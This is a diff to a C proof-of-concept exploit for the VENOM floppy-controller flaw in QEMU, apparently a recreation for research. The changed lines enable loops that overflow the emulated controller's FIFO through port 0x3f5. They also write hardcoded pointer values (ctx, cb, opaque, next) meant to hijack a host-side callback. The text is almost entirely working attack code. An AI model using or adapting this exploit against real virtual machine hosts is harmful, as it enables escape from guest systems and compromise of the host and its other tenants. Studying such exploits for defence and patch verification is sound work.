@@ -12,8 +12,11 @@ It's aim is to exploit and recreate possible Venom attack on QEMU before patch
 #define WRITE 0x05
 
 int main(void){
-        char ctx[8] = {0x00,0x1c,0x22,0xfe,0x24,0x7f,0x00,0x00};
-        char cb[8] =  {0x70,0xae,0x30,0xfc,0x24,0x7f,0x00,0x00};
+        char ctx[8] =   {0x00,0x6c,0x79,0xaf,0x8e,0x7f,0x00,0x00};
+        char cb[8] =    {0x50,0x3e,0x31,0xae,0x8e,0x7f,0x00,0x00};
+        char opaque[8]= {0x40,0x45,0x81,0xaf,0x8e,0x7f,0x00,0x00} ;
+        char next[8]=   {0xc0,0xe5,0x81,0xaf,0x8e,0x7f,0x00,0x00};
+        char sid[3]= {0x01,0x00,0x00};
         iopl(3);
         ioperm(FIFO, 1, 1);
 	// printf("write spc_command to port\n");
@@ -21,12 +24,21 @@ int main(void){
         int i,j;
         j = 0;
         printf("into loop\n");
-        // for(i=0; i<MAX_COUNT; i++ ){
-        //         outb(TEST_VAL,0x3f5);
-        // }
-        // for(i=0; i< 8; i++){
-        //         outb(ctx[i], FIFO);
-        // }
+        for(i=0; i<MAX_COUNT; i++ ){
+                outb(TEST_VAL,0x3f5);
+        }
+        for(i=0; i< 8; i++){
+                outb(ctx[i], FIFO);
+        }
+        for(i=0; i< 8; i++){
+                outb(cb[i], FIFO);
+        }
+        for(i=0; i< 8; i++){
+                outb(cb[i], FIFO);
+        }
+        for(i=0; i< 8; i++){
+                outb(cb[i], FIFO);
+        }
         for(i=0; i< 8; i++){
                 outb(cb[i], FIFO);
         }
